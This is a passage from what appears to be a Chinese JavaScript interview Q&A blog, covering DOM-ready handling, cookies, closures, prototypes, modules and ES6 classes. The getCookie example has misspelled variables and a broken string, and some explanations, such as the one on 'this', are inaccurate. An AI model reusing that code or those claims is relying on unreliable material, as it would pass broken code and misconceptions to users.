title="17、原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？"></a>17、原生JS的window.onload与Jquery的$(document).ready(function(){})有什么不同？</h2><p>如何用原生JS实现Jq的ready方法？</p><blockquote><p>window.onload()方法是必须等到页面内包括图片的所有元素加载完毕后才能执行。<br>$(document).ready()是DOM结构绘制完毕后就执行，不必等到加载完毕。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 传递函数给whenReady()</span></span><br><span class="line"><span class="comment"> * 当文档解析完毕且为操作准备就绪时，函数作为document的方法调用</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> whenReady = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;               <span class="comment">//这个函数返回whenReady()函数</span></span><br><span class="line">  <span class="keyword">var</span> funcs = [];             <span class="comment">//当获得事件时，要运行的函数</span></span><br><span class="line">  <span class="keyword">var</span> ready = <span class="literal">false</span>;          <span class="comment">//当触发事件处理程序时,切换为true</span></span><br><span class="line">  <span class="comment">//当文档就绪时,调用事件处理程序</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">handler</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ready) <span class="keyword">return</span>;       <span class="comment">//确保事件处理程序只完整运行一次</span></span><br><span class="line">    <span class="comment">//如果发生onreadystatechange事件，但其状态不是complete的话,那么文档尚未准备好</span></span><br><span class="line">    <span class="keyword">if</span> (e.type === <span class="string">'onreadystatechange'</span> &amp;&amp; <span class="built_in">document</span>.readyState !== <span class="string">'complete'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//运行所有注册函数</span></span><br><span class="line">    <span class="comment">//注意每次都要计算funcs.length</span></span><br><span class="line">    <span class="comment">//以防这些函数的调用可能会导致注册更多的函数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; funcs.length; i++) &#123;</span><br><span class="line">      funcs[i].call(<span class="built_in">document</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//事件处理函数完整执行,切换ready状态, 并移除所有函数</span></span><br><span class="line">    ready = <span class="literal">true</span>;</span><br><span class="line">    funcs = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//为接收到的任何事件注册处理程序</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener) &#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, handler, <span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'readystatechange'</span>, handler, <span class="literal">false</span>); <span class="comment">//IE9+</span></span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">'load'</span>, handler, <span class="literal">false</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">document</span>.attachEvent) &#123;</span><br><span class="line">    <span class="built_in">document</span>.attachEvent(<span class="string">'onreadystatechange'</span>, handler);</span><br><span class="line">    <span class="built_in">window</span>.attachEvent(<span class="string">'onload'</span>, handler);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//返回whenReady()函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">whenReady</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ready) &#123; fn.call(<span class="built_in">document</span>); &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; funcs.push(fn); &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">// 如果上述代码十分难懂，下面这个简化版：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">fn</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">document</span>.addEventListener) &#123;<span class="comment">//标准浏览器</span></span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">//注销事件, 避免反复触发</span></span><br><span class="line">      <span class="built_in">document</span>.removeEventListener(<span class="string">'DOMContentLoaded'</span>,<span class="built_in">arguments</span>.callee, <span class="literal">false</span>);</span><br><span class="line">      fn();<span class="comment">//执行函数</span></span><br><span class="line">    &#125;, <span class="literal">false</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">document</span>.attachEvent) &#123;<span class="comment">//IE</span></span><br><span class="line">    <span class="built_in">document</span>.attachEvent(<span class="string">'onreadystatechange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">document</span>.readyState == <span class="string">'complete'</span>) &#123;</span><br><span class="line">        <span class="built_in">document</span>.detachEvent(<span class="string">'onreadystatechange'</span>, <span class="built_in">arguments</span>.callee);</span><br><span class="line">        fn();<span class="comment">//函数执行</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）"><a href="#18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）" class="headerlink" title="18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）"></a>18、（设计题）想实现一个对页面某个节点的拖曳？如何做？（使用原生JS）</h2><blockquote><p>给需要拖拽的节点绑定mousedown, mousemove, mouseup事件<br>mousedown事件触发后，开始拖拽<br>mousemove时，需要通过event.clientX和clientY获取拖拽位置，并实时更新位置<br>mouseup时，拖拽结束<br>需要注意浏览器边界的情况</p></blockquote><h2 id="19、请实现如下功能"><a href="#19、请实现如下功能" class="headerlink" title="19、请实现如下功能"></a>19、请实现如下功能</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setcookie</span>(<span class="params">name,value,days</span>)</span>&#123;  <span class="comment">//给cookie增加一个时间变量</span></span><br><span class="line">  <span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>(); </span><br><span class="line">  exp.setTime(exp.getTime() + days*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>); <span class="comment">//设置过期时间为days天</span></span><br><span class="line">  <span class="built_in">document</span>.cookie = name + <span class="string">" = "</span>+ <span class="built_in">escape</span> (value) + <span class="string">"; expires = "</span> + exp.toGMTString(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">var</span> myCookie = <span class="string">""</span> + <span class="built_in">document</span>.cookie + <span class="string">";"</span>; </span><br><span class="line">  <span class="keyword">var</span> searchName = <span class="string">"+ name + "</span>= <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">var</span> startOfCookie = myCookie.indexOf(searchName);</span><br><span class="line">  <span class="keyword">var</span> endOfCookie;</span><br><span class="line">  <span class="keyword">if</span>(satrtOfCookie != <span class="number">-1</span>)&#123;</span><br><span class="line">    startOfcookie += searchName.length;</span><br><span class="line">    endOfCookie = myCookie.indexOf(<span class="string">";"</span>,startOfCookie);</span><br><span class="line">    result = (myCookie.substring(startOfCookie,endOfCookie));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> oTips = <span class="built_in">document</span>.getElementById(<span class="string">'tips'</span>);<span class="comment">//假设tips的id为tips</span></span><br><span class="line">  <span class="keyword">var</span> page = &#123;</span><br><span class="line">    check: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;<span class="comment">//检查tips的cookie是否存在并且允许显示</span></span><br><span class="line">      <span class="keyword">var</span> tips = getCookie(<span class="string">'tips'</span>);</span><br><span class="line">      <span class="keyword">if</span>(!tips || tips == <span class="string">'show'</span>) <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//tips的cookie不存在</span></span><br><span class="line">      <span class="keyword">if</span>(tips == <span class="string">"never_show_again"</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    hideTip: <span class="function"><span class="keyword">function</span>(<span class="params">bNever</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(bNever) setcookie(<span class="string">'tips'</span>, <span class="string">'never_show_again'</span>, <span class="number">365</span>);</span><br><span class="line">      oTips.style.display = <span class="string">"none"</span>;<span class="comment">//隐藏</span></span><br><span class="line">　　&#125;,</span><br><span class="line">    showTip: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      oTips.style.display = <span class="string">"inline"</span>;<span class="comment">//显示，假设tips为行级元素</span></span><br><span class="line">    &#125;,</span><br><span class="line">    init: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.check()) &#123;</span><br><span class="line">        _this.showTip();</span><br><span class="line">        setcookie(<span class="string">'tips'</span>, <span class="string">'show'</span>, <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      oTips.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      _this.hideTip(<span class="literal">true</span>);</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  page.init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="20、说出以下函数的作用是？空白区域应该填写什么？"><a href="#20、说出以下函数的作用是？空白区域应该填写什么？" class="headerlink" title="20、说出以下函数的作用是？空白区域应该填写什么？"></a>20、说出以下函数的作用是？空白区域应该填写什么？</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//define </span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">window</span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.str=str;</span><br><span class="line">  &#125;</span><br><span class="line">  fn.prototype.format = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arg = ______;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.str.replace(_____,<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> arg[b]||<span class="string">""</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">window</span>.fn = fn;</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br><span class="line"><span class="comment">//use</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = <span class="keyword">new</span> fn(<span class="string">'&lt;p&gt;&lt;a href="&#123;0&#125;"&gt;&#123;1&#125;&lt;/a&gt;&lt;span&gt;&#123;2&#125;&lt;/span&gt;&lt;/p&gt;'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(t.format(<span class="string">'http://www.alibaba.com'</span>,<span class="string">'Alibaba'</span>,<span class="string">'Welcome'</span>));</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><blockquote><p>访函数的作用是使用format函数将函数的参数替换掉{0}这样的内容，返回一个格式化后的结果：</p></blockquote><p>第一个空是：arguments<br>第二个空是：<code>/\{(\d+)\}/ig</code></p><h2 id="21、Javascript作用链域"><a href="#21、Javascript作用链域" class="headerlink" title="21、Javascript作用链域"></a>21、Javascript作用链域</h2><p>理解变量和函数的访问范围和生命周期，全局作用域与局部作用域的区别，JavaScript中没有块作用域，函数的嵌套形成不同层次的作用域，嵌套的层次形成链式形式，通过作用域链查找属性的规则需要深入理解。</p><h2 id="22、This对象"><a href="#22、This对象" class="headerlink" title="22、This对象"></a>22、This对象</h2><p>理解不同形式的函数调用方式下的this指向，理解事件函数、定时函数中的this指向，函数的调用形式决定了this的指向。</p><blockquote><p>在JavaScript中，this通常指向的是我们正在执行的函数本身，或者是，指向该函数所属的对象。<br>全局的this → 指向的是Window<br>函数中的this → 指向的是函数所在的对象<br>对象中的this → 指向其本身</p></blockquote><h2 id="23、-eval"><a href="#23、-eval" class="headerlink" title="23、 eval"></a>23、 eval</h2><p>它的功能是把对应的字符串解析成JS代码并运行；应该避免使用eval，不安全，非常耗性能</p><p>2个步骤:</p><p>一次解析成js语句<br>一次执行</p><h2 id="24、关于事件，IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#24、关于事件，IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="24、关于事件，IE与火狐的事件机制有什么区别？ 如何阻止冒泡？"></a>24、关于事件，IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</h2><p>[1].在IE中,事件对象是作为一个全局变量来保存和维护的.所有的浏览器事件,不管是用户触发的，还是其他事件,都会更新window.event对象.所以在代码中，只要调用window.event就可以获取事件对象， 再event.srcElement就可以取得触发事件的元素进行进一步处理.<br>[2].在FireFox中，事件对象却不是全局对象，一般情况下，是现场发生，现场使用，FireFox把事件对象自动传给事件处理程序.</p><h2 id="25、什么是闭包（closure），为什么要用它？"><a href="#25、什么是闭包（closure），为什么要用它？" class="headerlink" title="25、什么是闭包（closure），为什么要用它？"></a>25、什么是闭包（closure），为什么要用它？</h2><blockquote><p>简单的理解是函数的嵌套形成闭包，闭包包括函数本身已经它的外部作用域<br>使用闭包可以形成独立的空间，延长变量的生命周期，报存中间状态值</p></blockquote><p>执行say667()后,say667()闭包内部变量会存在, 而闭包内部函数的内部变量不会存在.使得Javascript的垃圾回收机制GC不会收回say667()所占用的资源，因为say667()的内部函数的执行需要依赖say667()中的变量。这是对闭包作用的非常直白的描述.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">say667</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Local variable that ends up within closure</span></span><br><span class="line">  <span class="keyword">var</span> num = <span class="number">666</span>;</span><br><span class="line">  <span class="keyword">var</span> sayAlert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(num); &#125;</span><br><span class="line">  num++;</span><br><span class="line">  <span class="keyword">return</span> sayAlert;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sayAlert = say667();</span><br><span class="line">sayAlert()<span class="comment">//执行结果应该弹出的667</span></span><br></pre></td></tr></table></figure><h2 id="26、javascript-代码中的”use-strict”-是什么意思-使用它区别是什么？"><a href="#26、javascript-代码中的”use-strict”-是什么意思-使用它区别是什么？" class="headerlink" title="26、javascript 代码中的”use strict”; 是什么意思 ? 使用它区别是什么？"></a>26、javascript 代码中的”use strict”; 是什么意思 ? 使用它区别是什么？</h2><p>意思是使用严格模式，使用严格模式，一些不规范的语法将不再支持</p><h2 id="27、如何判断一个对象是否属于某个类？"><a href="#27、如何判断一个对象是否属于某个类？" class="headerlink" title="27、如何判断一个对象是否属于某个类？"></a>27、如何判断一个对象是否属于某个类？</h2><p>Instanceof constructor</p><h2 id="28、new操作符具体干了什么呢"><a href="#28、new操作符具体干了什么呢" class="headerlink" title="28、new操作符具体干了什么呢?"></a>28、new操作符具体干了什么呢?</h2><blockquote><p>创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。<br>属性和方法被加入到 this 引用的对象中。<br>新创建的对象由 this 所引用，并且最后隐式的返回 this 。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj  = &#123;&#125;;</span><br><span class="line">obj.__proto__ = Base.prototype;</span><br><span class="line">Base.call(obj);</span><br></pre></td></tr></table></figure><h2 id="29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？"><a href="#29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？" class="headerlink" title="29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？"></a>29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？</h2><p>HasOwnProperty</p><h2 id="30、对JSON的了解"><a href="#30、对JSON的了解" class="headerlink" title="30、对JSON的了解"></a>30、对JSON的了解</h2><p>轻量级数据交互格式，可以形成复杂的嵌套格式，解析非常方便</p><h2 id="31、js延迟加载的方式有哪些"><a href="#31、js延迟加载的方式有哪些" class="headerlink" title="31、js延迟加载的方式有哪些"></a>31、js延迟加载的方式有哪些</h2><blockquote><p>方案一：<code>&lt;script&gt;</code>标签的<code>async=&quot;async&quot;</code>属性<br>方案二：<code>&lt;script&gt;</code>标签的<code>defer=&quot;defer&quot;</code>属性<br>方案三：动态创建<code>&lt;script&gt;</code>标签<br>方案四：<code>AJAX eval</code>（使用AJAX得到脚本内容，然后通过<code>eval_r(xmlhttp.responseText)</code>来运行脚本）<br>方案五：<code>iframe方式</code></p></blockquote><h2 id="32、模块化开发怎么做？"><a href="#32、模块化开发怎么做？" class="headerlink" title="32、模块化开发怎么做？"></a>32、模块化开发怎么做？</h2><blockquote><p>浏览器端 requirejs，seajs；<br>服务器端 nodejs；ES6模块化；<br>fis、webpack 等前端整体模块化解决方案；<br>grunt、gulp等前端工作流的使用</p></blockquote><h2 id="33、AMD（Modules-Asynchronous-Definition）、CMD（Common-Module-Definition）规范区别"><a href="#33、AMD（Modules-Asynchronous-Definition）、CMD（Common-Module-Definition）规范区别" class="headerlink" title="33、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别"></a>33、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别</h2><p>理解这两种规范的差异，主要通过requirejs与seajs的对比，<br>理解模块的定义与引用方式的差异以及这两种规范的设计原则</p><h2 id="34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）"><a href="#34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）" class="headerlink" title="34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）"></a>34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）</h2><blockquote><p>核心是js的加载模块，通过正则匹配模块以及模块的依赖关系，保证文件加载的先后顺序<br>根据文件的路径对加载过的文件做了缓存</p></blockquote><h2 id="35、自己设计实现一个-requireJS，你会怎么做？"><a href="#35、自己设计实现一个-requireJS，你会怎么做？" class="headerlink" title="35、自己设计实现一个 requireJS，你会怎么做？"></a>35、自己设计实现一个 requireJS，你会怎么做？</h2><p>核心是实现js的加载模块，维护js的依赖关系，控制好文件加载的先后顺序</p><h2 id="36、对ECMAScript6的了解"><a href="#36、对ECMAScript6的了解" class="headerlink" title="36、对ECMAScript6的了解"></a>36、对ECMAScript6的了解</h2><p>ES6新的语法糖，类，模块化等新特性</p><h2 id="37、ECMAScript6-怎么写class么，为什么会出现class这种东西"><a href="#37、ECMAScript6-怎么写class么，为什么会出现class这种东西" class="headerlink" title="37、ECMAScript6 怎么写class么，为什么会出现class这种东西?"></a>37、ECMAScript6 怎么写class么，为什么会出现class这种东西?</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(x, y) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'('</span>+<span class="keyword">this</span>.x+<span class="string">', '</span>+<span class="keyword">this</span>.y+<span class="string">')'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="39、数组和对象有哪些原生方法"><a href="#39、数组和对象有哪些原生方法" class="headerlink" title="39、数组和对象有哪些原生方法"></a>39、数组和对象有哪些原生方法</h2><blockquote><p>Array.concat( ) 连接数组<br>Array.join( ) 将数组元素连接起来以构建一个字符串<br>Array.length 数组的大小<br>Array.pop( ) 删除并返回数组的最后一个元素<br>Array.push( ) 给数组添加元素<br>Array.reverse( ) 颠倒数组中元素的顺序<br>Array.shift( ) 将元素移出数组<br>Array.slice( ) 返回数组的一部分<br>Array.sort( ) 对数组元素进行排序<br>Array.splice( ) 插入、删除或替换数组的元素<br>Array.toLocaleString( ) 把数组转换成局部字符串<br>Array.toString( ) 将数组转换成一个字符串<br>Array.unshift( ) 在数组头部插入一个元素<br>Object.hasOwnProperty( ) 检查属性是否被继承<br>Object.isPrototypeOf( ) 一个对象是否是另一个对象的原型<br>Object.propertyIsEnumerable( ) 是否可以通过for/in循环看到属性<br>Object.toLocaleString( ) 返回对象的本地字符串表示<br>Object.toString( ) 定义一个对象的字符串表示<br>Object.valueOf( ) 指定对象的原始值</p></blockquote><h2 id="40、JS-怎么实现一个类。怎么实例化这个类"><a href="#40、JS-怎么实现一个类。怎么实例化这个类" class="headerlink" title="40、JS 怎么实现一个类。怎么实例化这个类"></a>40、JS 怎么实现一个类。怎么实例化这个类</h2><blockquote><p>严格来讲js中并没有类的概念<br>不过js中的函数可以作为构造函数来使用<br>通过new来实例化，其实函数本身也是一个对象。</p></blockquote><h2 id="41、JavaScript中的作用域与变量声明提升？"><a href="#41、JavaScript中的作用域与变量声明提升？" class="headerlink" title="41、JavaScript中的作用域与变量声明提升？"></a>41、JavaScript中的作用域与变量声明提升？</h2><blockquote><p>理解JavaScript的预解析机制<br>js的运行主要分两个阶段<br>js的预解析和运行<br>预解析阶段所有的变量声明和函数定义都会提前，但是变量的赋值不会提前</p></blockquote><h2 id="42、如何编写高性能的Javascript"><a href="#42、如何编写高性能的Javascript" class="headerlink" title="42、如何编写高性能的Javascript"></a>42、如何编写高性能的Javascript</h2><blockquote><p>使用 DocumentFragment 优化多次 append<br>通过模板元素 clone ，替代 createElement<br>使用一次 innerHTML 赋值代替构建 dom 元素<br>使用 firstChild 和 nextSibling 代替 childNodes 遍历 dom 元素<br>使用 Array 做为 StringBuffer ，代替字符串拼接的操作<br>将循环控制量保存到局部变量<br>顺序无关的遍历时，用 while 替代 for<br>将条件分支，按可能性顺序从高到低排列<br>在同一条件子的多（ &gt;2 ）条件分支时，使用 switch 优于 if<br>使用三目运算符替代条件分支<br>需要不断执行的时候，优先考虑使用 setInterval</p></blockquote><h2 id="43、那些操作会造成内存泄漏"><a href="#43、那些操作会造成内存泄漏" class="headerlink" title="43、那些操作会造成内存泄漏"></a>43、那些操作会造成内存泄漏</h2><p>闭包，循环</p><h2 id="44、javascript对象的几种创建方式"><a href="#44、javascript对象的几种创建方式" class="headerlink" title="44、javascript对象的几种创建方式"></a>44、javascript对象的几种创建方式</h2><blockquote><p>工厂模式<br>构造函数模式<br>原型模式<br>混合构造函数和原型模式<br>动态原型模式<br>寄生构造函数模式<br>稳妥构造函数模式</p></blockquote><h2 id="45、javascript-继承的-6-种方法？"><a href="#45、javascript-继承的-6-种方法？" class="headerlink" title="45、javascript 继承的 6 种方法？"></a>45、javascript 继承的 6 种方法？</h2><blockquote><p>原型链继承<br>借用构造函数继承<br>组合继承(原型+借用构造)<br>原型式继承<br>寄生式继承<br>寄生组合式继承</p></blockquote><h2 id="46、eval"><a href="#46、eval" class="headerlink" title="46、eval"></a>46、eval</h2><blockquote><p>它的功能是把对应的字符串解析成JS代码并运行<br>应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）</p></blockquote><h2 id="47、JavaScript-原型，原型链-有什么特点？"><a href="#47、JavaScript-原型，原型链-有什么特点？" class="headerlink" title="47、JavaScript 原型，原型链 ? 有什么特点？"></a>47、JavaScript 原型，原型链 ? 有什么特点？</h2><blockquote><p>原型对象也是普通的对象，是对象一个自带隐式的<code>__proto__</code>属性，原型也有可能有自己的原型，如果一个原型对象的原型不为 null 的话，我们就称之为原型链<br>原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链</p></blockquote><h2 id="JavaScript的数据对象有那些属性值"><a href="#JavaScript的数据对象有那些属性值" class="headerlink" title="JavaScript的数据对象有那些属性值"></a>JavaScript的数据对象有那些属性值</h2><blockquote><p>writable：这个属性的值是否可以改。<br>configurable：这个属性的配置是否可以删除，修改。<br>enumerable：这个属性是否能在for…in循环中遍历出来或在Object.keys中列举出来。<br>value：属性值。</p></blockquote><p>当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，就会查找他的Prototype对象是否有这个属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">proto</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Dummy</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">  Dummy.prototype = proto;</span><br><span class="line">  Dummy.prototype.constructor = Dummy;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Dummy(); <span class="comment">//等价于Object.create(Person);</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">old</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    F.prototype = old;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> 